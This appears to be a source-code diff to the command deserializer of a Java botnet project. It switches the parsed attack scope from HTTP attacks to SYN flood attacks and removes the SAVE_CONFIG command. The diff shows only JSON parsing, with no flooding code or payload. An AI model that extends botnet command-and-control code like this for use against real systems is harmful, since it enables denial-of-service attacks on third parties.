@@ -26,7 +26,7 @@
 
 package com.acmutv.botnet.core.control.command.serial;
 
-import com.acmutv.botnet.core.attack.HttpAttack;
+import com.acmutv.botnet.core.attack.SynFloodAttack;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.core.control.command.CommandScope;
 import com.acmutv.botnet.tool.time.Interval;
@@ -93,19 +93,19 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
 
       switch (cmd.getScope()) {
 
-        case ATTACK_HTTP:
+        case ATTACK_SYNFLOOD:
           if (node.hasNonNull("attacks")) {
-            List<HttpAttack> httpAttacks = new ArrayList<>();
+            List<SynFloodAttack> attacks = new ArrayList<>();
             Iterator<JsonNode> i = node.get("attacks").elements();
             while (i.hasNext()) {
               JsonNode n = i.next();
-              HttpAttack attack = ctx.readValue(n.traverse(parser.getCodec()), HttpAttack.class);
-              httpAttacks.add(attack);
+              SynFloodAttack attack = ctx.readValue(n.traverse(parser.getCodec()), SynFloodAttack.class);
+              attacks.add(attack);
             }
 
-            cmd.getParams().put("attacks", httpAttacks);
+            cmd.getParams().put("attacks", attacks);
           } else {
-            throw new IOException("Cannot read parameters [attacks] for scope [ATTACK_HTTP] (missing)");
+            throw new IOException("Cannot read parameters [attacks] for scope [ATTACK_SYNFLOOD] (missing)");
           }
 
           if (node.hasNonNull("delay")) {
@@ -185,19 +185,6 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
           if (node.hasNonNull("report")) {
             final Boolean restartReport = node.get("report").asBoolean();
             cmd.getParams().put("report", restartReport);
-          }
-
-          break;
-
-        case SAVE_CONFIG:
-          if (node.hasNonNull("delay")) {
-            final Interval saveConfigDelay = Interval.valueOf(node.get("delay").asText());
-            cmd.getParams().put("delay", saveConfigDelay);
-          }
-
-          if (node.hasNonNull("report")) {
-            final Boolean saveConfigReport = node.get("report").asBoolean();
-            cmd.getParams().put("report", saveConfigReport);
           }
 
           break;
